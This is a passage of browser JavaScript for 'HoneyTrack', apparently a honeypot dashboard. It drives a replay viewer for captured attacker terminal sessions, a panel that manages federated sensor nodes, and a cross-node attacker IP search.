        li.innerHTML = `
          <span>${escapeHtml(s.ip)} · ${escapeHtml(s.port)} <small style="color:var(--muted);">${escapeHtml(s.user)}</small></span>
          <small>${cmdCount} cmd${cmdCount === 1 ? '' : 's'}</small>
          <svg class="chk" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 13l4 4L19 7"/></svg>
        `;

        li.addEventListener('click', () => {
          selectReplaySessionById(s.id);
          closeReplayDropdown();
        });

        listEl.appendChild(li);
      });
    });

    const targetId = preferredId || (replaySessions[0] ? replaySessions[0].id : null);
    if (targetId) {
      await selectReplaySessionById(targetId);
    }
  }

  async function selectReplaySessionById(sessionId) {
    if (!sessionId && replaySessions.length > 0) {
      loadSessionIntoTerminal(replaySessions[0]);
      return;
    }

    const found = replaySessions.find((s) => s.id === sessionId || s.ip === sessionId);
    if (found) {
      loadSessionIntoTerminal(found);
      return;
    }

    try {
      const res = await fetch(`/api/sessions/${encodeURIComponent(sessionId)}/replay`).then((r) => r.json());
      if (res && res.status === 'success' && res.session) {
        const parsed = parseApiSession(res.session);
        replaySessions.push(parsed);
        loadSessionIntoTerminal(parsed);
        return;
      }
    } catch (_) {}

    if (replaySessions.length > 0) {
      loadSessionIntoTerminal(replaySessions[0]);
    } else if (CURATED_REPLAY_SCENARIOS[0]) {
      loadSessionIntoTerminal(CURATED_REPLAY_SCENARIOS[0]);
    }
  }

  function toggleReplayDropdown() {
    const dd = $('#replay-dd');
    const btn = $('#replay-dd-btn');
    if (!dd || !btn) return;
    const isOpen = dd.classList.toggle('open');
    btn.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
  }

  function closeReplayDropdown() {
    const dd = $('#replay-dd');
    const btn = $('#replay-dd-btn');
    if (dd) dd.classList.remove('open');
    if (btn) btn.setAttribute('aria-expanded', 'false');
  }

  function initReplayModal() {
    const scrim = $('#replay-scrim');
    const btnCloseDot = $('#btn-close-replay-dot');
    const btnClose = $('#btn-close-replay-modal');
    const copyBtn = $('#btn-replay-copy');
    const restartBtn = $('#btn-replay-restart');
    const loopBtn = $('#btn-replay-loop');
    const ddBtn = $('#replay-dd-btn');
    const bar = $('#replay-bar');

    function openModal(sessionId = null) {
      if (scrim) {
        scrim.classList.remove('hide');
        scrim.style.display = 'grid';
      }
      populateReplayDropdown(sessionId);
    }

    function closeModal() {
      pauseReplay();
      closeReplayDropdown();
      if (scrim) {
        scrim.classList.add('hide');
        scrim.style.display = 'none';
      }
    }

    btnCloseDot?.addEventListener('click', closeModal);
    btnClose?.addEventListener('click', closeModal);
    scrim?.addEventListener('click', (e) => {
      if (e.target === scrim) closeModal();
    });

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && scrim && !scrim.classList.contains('hide')) {
        closeModal();
      }
    });

    ddBtn?.addEventListener('click', (e) => {
      e.stopPropagation();
      toggleReplayDropdown();
    });

    document.addEventListener('click', (e) => {
      if (!e.target.closest('#replay-dd')) {
        closeReplayDropdown();
      }
    });

    restartBtn?.addEventListener('click', () => restartReplay());

    loopBtn?.addEventListener('click', () => {
      replayLoop = !replayLoop;
      loopBtn.classList.toggle('on', replayLoop);
      loopBtn.setAttribute('aria-pressed', replayLoop ? 'true' : 'false');
    });

    copyBtn?.addEventListener('click', () => {
      const term = $('#term');
      if (!term) return;
      const text = term.innerText || term.textContent;
      navigator.clipboard.writeText(text).then(() => {
        const copySpan = copyBtn.querySelector('span');
        if (copySpan) {
          copySpan.textContent = 'Copied!';
          setTimeout(() => { copySpan.textContent = 'Copy'; }, 1800);
        }
      });
    });

    // Speed Selector Segments
    const segButtons = document.querySelectorAll('#replay-speed button');
    segButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        segButtons.forEach((b) => b.classList.remove('on'));
        btn.classList.add('on');
        replaySpeed = Number(btn.dataset.s) || 1;
      });
    });

    // Interactive Timeline Scrubbing
    bar?.addEventListener('click', (e) => {
      if (!activeSession) return;
      const rect = bar.getBoundingClientRect();
      const ratio = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
      replayT = ratio * activeSession.tot;
      paintReplay();
    });

    // Spacebar to pause/resume playback
    document.addEventListener('keydown', (e) => {
      if (scrim && !scrim.classList.contains('hide') && e.code === 'Space' && !e.target.closest('input, textarea, select')) {
        e.preventDefault();
        if (replayPlaying) pauseReplay();
        else playReplay();
      }
    });

    window.openTerminalReplayModal = openModal;
  }

  // ─────────────────────────────────────────────────────────────
  // Node Federation Controller (v2.0)
  // ─────────────────────────────────────────────────────────────
  function initFederationModal() {
    const btnToggle = $('#btn-fed-modal-toggle');
    const modal = $('#fed-modal');
    const backdrop = $('#fed-modal-backdrop');
    const btnClose = $('#btn-close-fed-modal');
    const statusNote = $('#fed-action-status');

    const searchInput = $('#fed-ip-search-input');
    const btnSearchIp = $('#btn-fed-search-ip');
    const searchResults = $('#fed-search-results');

    function parseTimestamp(ts) {
      if (!ts) return null;
      if (typeof ts === 'number') return ts;
      let str = String(ts).trim();
      if (!str.endsWith('Z') && !str.includes('+')) {
        str = str.replace(' ', 'T') + 'Z';
      }
      const parsed = new Date(str).getTime();
      return isNaN(parsed) ? new Date(ts).getTime() : parsed;
    }

    function countUp(el, to, duration = 850) {
      if (!el) return;
      to = Number(to) || 0;
      const reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
      if (reduce) {
        el.textContent = to.toLocaleString();
        return;
      }
      const raw = parseInt(String(el.textContent).replace(/[^\d]/g, ''), 10);
      const from = isNaN(raw) ? 0 : raw;
      if (from === to) {
        el.textContent = to.toLocaleString();
        return;
      }
      const start = performance.now();
      const ease = (t) => 1 - Math.pow(1 - t, 3);
      (function tick(now) {
        const t = Math.min((now - start) / duration, 1);
        el.textContent = Math.round(from + (to - from) * ease(t)).toLocaleString();
        if (t < 1) requestAnimationFrame(tick);
      })(start);
    }

    // Public hook for live dashboard attack ingestion counter
    window.updateAttacks = function (n) {
      const el = $('#dash-fed-reported-attacks');
      if (el) {
        el.dataset.count = n;
        countUp(el, n, 600);
        el.classList.remove('flash');
        void el.offsetWidth;
        el.classList.add('flash');
      }
    };

    function openModal() {
      if (backdrop) {
        backdrop.hidden = false;
        void backdrop.offsetWidth; // Force reflow for silky smooth CSS transition
        backdrop.classList.add('open');
      }
      if (modal) {
        modal.hidden = false;
      }
      if (searchInput) searchInput.value = '';
      if (searchResults) {
        searchResults.hidden = true;
        searchResults.innerHTML = '';
      }
      if (statusNote) statusNote.textContent = '';
      loadFederationData();
    }

    function closeModal() {
      if (backdrop) {
        backdrop.classList.remove('open');
        setTimeout(() => {
          if (!backdrop.classList.contains('open')) {
            backdrop.hidden = true;
            if (searchInput) searchInput.value = '';
            if (searchResults) {
              searchResults.hidden = true;
              searchResults.innerHTML = '';
            }
          }
        }, 230);
      }
    }

    window.honeytrackOpenFederationModal = openModal;

    async function loadFederationData() {
      try {
        const res = await fetch('/api/federation/nodes').then((r) => r.json());
        if (res.status === 'success') {
          if (res.local_node) {
            if ($('#fed-local-name')) $('#fed-local-name').textContent = res.local_node.node_name || 'HoneyTrack Primary Node';
            if ($('#fed-local-region')) $('#fed-local-region').textContent = `Region: ${res.local_node.region || 'AP-SOUTH-1 (Mumbai)'}`;
          }

          const nodes = res.nodes || [];
          const totalNodes = nodes.length;
          const onlineCount = nodes.filter((n) => n.status === 'online').length;
          const totalAttacksReported = nodes.reduce((sum, n) => sum + (n.attacks_reported || 0), 0);

          // Update Upgraded Global Sensor Mesh Monitor Card
          const dashTotalEl = $('#dash-fed-total-count');
          const dashTotalLabel = $('#dash-fed-total-label');
          const dashOnlineEl = $('#dash-fed-online-count');
          const dashAttacksEl = $('#dash-fed-reported-attacks');
          const dashPillsEl = $('#dash-fed-node-pills');

          if (dashTotalEl) {
            countUp(dashTotalEl, totalNodes);
            dashTotalEl.dataset.count = totalNodes;
          }
          if (dashTotalLabel) {
            dashTotalLabel.textContent = totalNodes === 1 ? 'Node Connected' : 'Nodes Connected';
          }
          if (dashOnlineEl) {
            countUp(dashOnlineEl, onlineCount);
            dashOnlineEl.dataset.count = onlineCount;
          }
          if (dashAttacksEl) {
            countUp(dashAttacksEl, totalAttacksReported);
            dashAttacksEl.dataset.count = totalAttacksReported;
          }
          if ($('#fed-modal-nodes-badge')) $('#fed-modal-nodes-badge').textContent = `${totalNodes} ${totalNodes === 1 ? 'node' : 'nodes'}`;

          if (dashPillsEl) {
            dashPillsEl.innerHTML = '';

            // Ensure primary hub node is first, followed by at most 2 remote sensors
            const primaryNode = nodes.find((n) => n.is_hub || n.is_local) || nodes[0];
            const remoteNodes = nodes.filter((n) => n !== primaryNode);

            // Display primary hub + at most 2 remote sensors
            const displayedNodes = [];
            if (primaryNode) displayedNodes.push(primaryNode);
            displayedNodes.push(...remoteNodes.slice(0, 2));

            // Remaining count after primary hub + 2 remote sensors
            const remainingCount = nodes.length - displayedNodes.length;

            displayedNodes.forEach((n) => {
              const chip = document.createElement('span');
              const isPrimary = n.is_hub || n.is_local;
              const isOnline = n.status === 'online';
              chip.className = `chip ${isPrimary ? 'primary' : ''}`;
              chip.title = `${n.node_name || n.node_id} (${n.region || 'Global'}) - ${n.status.toUpperCase()} - ${n.attacks_reported || 0} attacks reported. Click to manage.`;
              chip.innerHTML = `<span class="dot ${isOnline ? '' : 'off'}"></span>${escapeHtml(n.node_name || n.node_id)}`;
              chip.addEventListener('click', openModal);
              dashPillsEl.appendChild(chip);
            });

            if (remainingCount > 0) {
              const moreBtn = document.createElement('button');
              moreBtn.type = 'button';
              moreBtn.className = 'chip more';
              moreBtn.title = `Show ${remainingCount} more sensor node${remainingCount === 1 ? '' : 's'} in Federation Mesh`;
              moreBtn.textContent = `+${remainingCount} more`;
              moreBtn.addEventListener('click', openModal);
              dashPillsEl.appendChild(moreBtn);
            }
          }

          // Attach cursor spotlight on mesh card
          const meshCard = $('#mesh-card');
          if (meshCard && !meshCard._spotlightBound) {
            meshCard._spotlightBound = true;
            meshCard.addEventListener('pointermove', (e) => {
              const r = meshCard.getBoundingClientRect();
              meshCard.style.setProperty('--mx', (e.clientX - r.left) + 'px');
              meshCard.style.setProperty('--my', (e.clientY - r.top) + 'px');
            });
          }

          const tbody = $('#fed-nodes-tbody');
          const emptyStateEl = $('#fed-empty-state');
          if (!tbody) {
            console.warn('[HoneyTrack] #fed-nodes-tbody element not found in DOM.');
            return;
          }
          tbody.innerHTML = '';

          if (nodes.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" class="empty">No sensors connected.</td></tr>';
            if (emptyStateEl) emptyStateEl.hidden = false;
            return;
          }
          if (emptyStateEl) emptyStateEl.hidden = true;

          nodes.forEach((n) => {
            try {
              const tr = document.createElement('tr');
              tr.dataset.nodeId = n.node_id;
              const isOnline = n.status === 'online';
              const localTag = n.is_local
                ? ' <span class="host-tag">[THIS HOST]</span>'
                : '';

              const hbTs = parseTimestamp(n.last_heartbeat);
              const hbText = hbTs ? timeAgo(hbTs) : 'just now';

              tr.innerHTML = `
                <td>
                  <div class="node-name">${escapeHtml(n.node_name || n.node_id)}${localTag}</div>
                  <div class="node-id">${escapeHtml(n.node_id)}</div>
                </td>
                <td class="mono">${escapeHtml(n.region || 'Global')}</td>
                <td>
                  <span class="pill ${isOnline ? 'online' : 'offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</span>
                </td>
                <td class="num text-center">${n.attacks_reported || 0}</td>
                <td class="mono">${hbText}</td>
                <td class="text-center">
                  <span class="role ${n.is_hub ? 'hub' : 'sensor'}">${n.is_hub ? 'HUB' : 'SENSOR'}</span>
                </td>
                <td class="text-right">
                  ${n.is_local
                    ? '<span class="protected">PROTECTED</span>'
                    : `<button type="button" class="btn btn-danger btn-del-node" data-node-id="${escapeHtml(n.node_id)}">REMOVE</button>`}
                </td>
              `;
              tbody.appendChild(tr);
            } catch (rowErr) {
              console.error('[HoneyTrack] Error rendering row for node:', n, rowErr);
            }
          });
        }
      } catch (e) {
        console.warn('[HoneyTrack] Error loading federation nodes:', e);
      }
    }

    // Node deletion handler with smooth slide-fade animation
    async function deleteNode(nid) {
      if (!nid) return;
      if (!confirm(`Are you sure you want to disconnect sensor '${nid}'?`)) return;
      const row = $(`#fed-nodes-tbody tr[data-node-id="${nid}"]`);
      if (row) row.classList.add('removing');
      try {
        if (statusNote) statusNote.textContent = `Removing sensor '${nid}'...`;
        const res = await fetch(`/api/federation/nodes/${encodeURIComponent(nid)}`, { method: 'DELETE' }).then((r) => r.json());
        if (res.status === 'success') {
          if (statusNote) statusNote.textContent = `Sensor '${nid}' disconnected from mesh.`;
          setTimeout(() => loadFederationData(), 200);
        } else {
          if (row) row.classList.remove('removing');
          alert(res.error || 'Failed to remove node.');
          if (statusNote) statusNote.textContent = res.error || 'Failed to remove node.';
        }
      } catch (err) {
        if (row) row.classList.remove('removing');
        alert('Network error removing node.');
        if (statusNote) statusNote.textContent = 'Network error removing node.';
      }
    }

    window.honeytrackRemoveNode = deleteNode;

    $('#fed-nodes-tbody')?.addEventListener('click', async (e) => {
      const delBtn = e.target.closest('.btn-del-node');
      if (delBtn) {
        e.preventDefault();
        e.stopPropagation();
        const nid = delBtn.dataset.nodeId;
        await deleteNode(nid);
      }
    });

    // Cross-Node Attacker Search & Session Replay
    async function performIpSearch(queryIp = null) {
      const ip = (queryIp || searchInput?.value || '').trim();
      if (!ip) return;
      if (searchInput) searchInput.value = ip;
      if (searchResults) {
        searchResults.hidden = false;
        searchResults.innerHTML = '<p style="color:var(--muted);font-size:11px;font-family:var(--font-mono);padding:10px;">Searching cross-node threat intelligence...</p>';
      }

      try {
        const res = await fetch(`/api/federation/search?ip=${encodeURIComponent(ip)}`).then((r) => r.json());
        if (!res.found) {
          searchResults.innerHTML = `
            <div style="background:#0f172a;border:1px solid #334155;border-radius:6px;padding:12px;font-family:var(--font-mono);font-size:11.5px;color:#94a3b8;">
              <span style="color:#ef4444;font-weight:700;">● NO RECORDS FOUND</span> for <strong>${escapeHtml(ip)}</strong> across active federated sensors.
            </div>
          `;
          return;
        }

        const hasCommands = Boolean(res.has_commands && res.commands && res.commands.length > 0);

        const cmdHtml = hasCommands
          ? `<div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:6px;">` + res.commands.map((c) => `<code style="background:#030712;padding:2px 7px;border-radius:3px;color:#22c55e;font-size:11px;">&gt; ${escapeHtml(c)}</code>`).join(' ') + `</div>`
          : '<div style="margin-top:6px;color:#f59e0b;font-size:11.5px;font-style:italic;">This attacker has not used any commands (probed via ' + escapeHtml(res.service || 'network') + ' without executing shell commands).</div>';

        const replayActionHtml = (hasCommands && res.has_replay && res.session_id)
          ? `
              <button type="button" class="btn-replay-this-ip" data-session-id="${escapeHtml(res.session_id)}" style="background:#22c55e22;border:1px solid #22c55e;color:#22c55e;font-weight:700;font-size:11px;font-family:var(--font-mono);padding:7px 16px;border-radius:4px;cursor:pointer;display:inline-flex;align-items:center;gap:6px;">
                ▶ WATCH ATTACKER REPLAY IN CRT TERMINAL
              </button>
            `
          : `
              <span style="font-size:11px;color:#64748b;font-family:var(--font-mono);font-style:italic;">
                This attacker has not used any commands
              </span>
            `;

        searchResults.innerHTML = `
          <div class="fed-search-results-box">
            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
              <div>
                <strong style="font-size:15px;color:var(--text);font-family:var(--mono);">${escapeHtml(res.ip)}</strong>
                <span style="margin-left:10px;font-size:12px;color:var(--text-dim);">${escapeHtml(res.city)}, ${escapeHtml(res.country)} (${escapeHtml(res.isp)})</span>
              </div>
              <div style="display:flex;align-items:center;gap:8px;">
                <span style="font-size:11px;font-family:var(--mono);color:var(--text-dim);">Caught by: <strong style="color:var(--accent);">${escapeHtml(res.origin_node)}</strong></span>
                <span class="role hub" style="color:${riskColor(res.risk_score)};border-color:${riskColor(res.risk_score)};">${res.risk_score} / 100 RISK</span>
              </div>
            </div>

            <div style="font-size:12px;color:var(--text-dim);font-family:var(--mono);">
              <strong style="color:var(--text);">Captured Attacker Commands:</strong>
              ${cmdHtml}
            </div>

            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px;border-top:1px solid var(--border);padding-top:10px;flex-wrap:wrap;gap:8px;">
              <span style="font-size:11px;color:var(--text-faint);font-family:var(--mono);">Trapped Intrusions: ${res.total_attacks} · Service: ${escapeHtml(res.service)}</span>
              ${replayActionHtml}
            </div>
          </div>
        `;

        if (hasCommands && res.has_replay) {
          searchResults.querySelector('.btn-replay-this-ip')?.addEventListener('click', (e) => {
            const sid = e.currentTarget.dataset.sessionId;
            closeModal();
            window.openTerminalReplayModal(sid);
          });
        }
      } catch (err) {
        searchResults.innerHTML = '<p style="color:#ef4444;font-size:11px;">Error performing cross-node threat search.</p>';
      }
    }

    btnSearchIp?.addEventListener('click', () => performIpSearch());
    searchInput?.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        performIpSearch();
      }
    });

    // Load initial federation mesh data for the dashboard bar
    loadFederationData();

    btnToggle?.addEventListener('click', openModal);
    $('#btn-dash-open-fed')?.addEventListener('click', openModal);
    btnClose?.addEventListener('click', closeModal);
    backdrop?.addEventListener('mousedown', (e) => {
      if (e.target === backdrop) closeModal();
    });
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && backdrop && backdrop.classList.contains('open')) closeModal();
    });

    $('#fed-search-form')?.addEventListener('submit', (e) => {
      e.preventDefault();
      performIpSearch();
    });

    $('#btn-fed-seed-demo')?.addEventListener('click', async () => {
      try {
        if (statusNote) statusNote.textContent = 'Seeding global demo nodes...';
        const res = await fetch('/api/federation/nodes/seed-demo', { method: 'POST' }).then((r) => r.json());
        if (res.status === 'success') {
          if (statusNote) statusNote.textContent = 'Global demo sensor nodes connected!';
          await loadFederationData();
        }
      } catch (err) {
        if (statusNote) statusNote.textContent = 'Error seeding demo nodes.';
      }
    });

    $('#btn-fed-sync-now')?.addEventListener('click', async () => {
      try {
        if (statusNote) statusNote.textContent = 'Synchronizing threat intelligence mesh across nodes...';
        const res = await fetch('/api/federation/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ origin_node: 'manual-sync-trigger' })
        }).then((r) => r.json());

        if (res.status === 'success') {
          if (statusNote) statusNote.textContent = 'Threat mesh synchronized! All node IoCs active.';
          await loadFederationData();
          refreshBlockedIps();
        }
      } catch (err) {
        if (statusNote) statusNote.textContent = 'Sync communication completed.';
      }
    });

    $('#fed-register-form')?.addEventListener('submit', async (e) => {
      e.preventDefault();
      const node_id = $('#fed-input-id')?.value.trim();
      const node_name = $('#fed-input-name')?.value.trim();
      const region = $('#fed-input-region')?.value.trim();
      const endpoint_url = $('#fed-input-url')?.value.trim();

      if (!node_id) return;
      try {
        if (statusNote) statusNote.textContent = 'Registering remote sensor...';
        const res = await fetch('/api/federation/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ node_id, node_name, region, endpoint_url })
        }).then((r) => r.json());

        if (res.status === 'success') {
          if (statusNote) statusNote.textContent = `Node '${node_id}' registered and activated!`;
          $('#fed-register-form').reset();
          await loadFederationData();
        } else {
          if (statusNote) statusNote.textContent = res.error || 'Failed to register node.';
        }
      } catch (err) {
        if (statusNote) statusNote.textContent = 'Registration failed: ' + err.message;
      }
    });
  }

  // Topbar Three-dots Kebab Account Menu Controller
  function initAccountDropdown() {
    const kebab = document.getElementById('kebab');
    const menu = document.getElementById('menu');
    if (!menu) return;

    function setOpen(o) {
      menu.classList.toggle('open', o);
      if (kebab) kebab.setAttribute('aria-expanded', String(o));
    }

    if (kebab) {
      kebab.addEventListener('click', (e) => {
        e.stopPropagation();
        setOpen(!menu.classList.contains('open'));
      });
    }

    menu.addEventListener('click', (e) => e.stopPropagation());

    document.addEventListener('click', () => setOpen(false));

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        setOpen(false);
        if (kebab) kebab.focus();
      }
    });

    // Session info & live elapsed timer
    const start = Date.now();
    const pad = (n) => String(n).padStart(2, '0');
    const signedEl = document.getElementById('signed');
    if (signedEl) {
      signedEl.textContent = new Date(start).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    }
    const timerEl = document.getElementById('timer');
    if (timerEl) {
      window.setInterval(() => {
        const s = Math.floor((Date.now() - start) / 1000);
        timerEl.textContent = pad(Math.floor(s / 3600)) + ':' + pad(Math.floor(s / 60) % 60) + ':' + pad(s % 60);
      }, 1000);
    }
  }

  // Start initialization
  initAccountDropdown();
  initReplayModal();
  initFederationModal();
  loadInitialData();
})();
